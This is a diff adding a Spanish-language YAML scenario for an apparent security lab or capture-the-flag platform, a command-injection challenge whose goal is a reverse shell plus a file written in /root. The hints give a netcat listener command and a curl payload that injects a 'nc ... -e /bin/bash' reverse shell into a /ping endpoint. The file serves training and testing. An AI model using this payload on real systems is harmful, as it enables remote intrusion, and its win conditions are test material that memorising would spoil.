@@ -1,0 +1,44 @@
+title: "Command Injection → Reverse Shell (and/or nodes)"
+description: >
+  Variante del escenario de command injection que expresa la victoria con nodos
+  lógicos (and/or) en vez de una lista plana con condition: all. La reverse
+  shell se acepta hacia cualquiera de dos puertos comunes del atacante.
+author: "Dylan Riquelme"
+level: intermediate
+category: web
+
+environment:
+  image: "flexipwn/vuln-command-injection"
+  attacker_image: "flexipwn/attacker"
+  log_paths: []
+  ports: []
+  startup_delay_seconds: 3.0
+
+hints:
+  - "El env_id se muestra al iniciar el run. Los contenedores se llaman flexipwn-{env_id}-vulnerable y flexipwn-{env_id}-attacker dentro de la red interna."
+  - "Primero entra al atacante por SSH (puerto expuesto en la CLI) y abre un listener: nc -lvp 4444"
+  - "Desde el atacante, envía el payload al vulnerable: curl 'http://flexipwn-{env_id}-vulnerable:5001/ping?host=;nc+flexipwn-{env_id}-attacker+4444+-e+/bin/bash'"
+  - "El endpoint /ping ejecuta el comando sin sanitizar"
+
+targets:
+  - type: and
+    description: "Reverse shell establecida Y evidencia de ejecución como root"
+    targets:
+      - type: or
+        description: "Conexión saliente de la reverse shell hacia un puerto común del atacante"
+        targets:
+          - type: network_connection
+            dst_port: 4444
+            description: "Conexión TCP hacia el puerto 4444 del atacante detectada"
+
+          - type: network_connection
+            dst_port: 9001
+            description: "Conexión TCP hacia el puerto 9001 del atacante detectada"
+
+      - type: file_created
+        path: "/root/"
+        pattern: "*.txt"
+        description: "Archivo .txt creado en directorio root"
+
+condition: all
+timeout_seconds: 18000
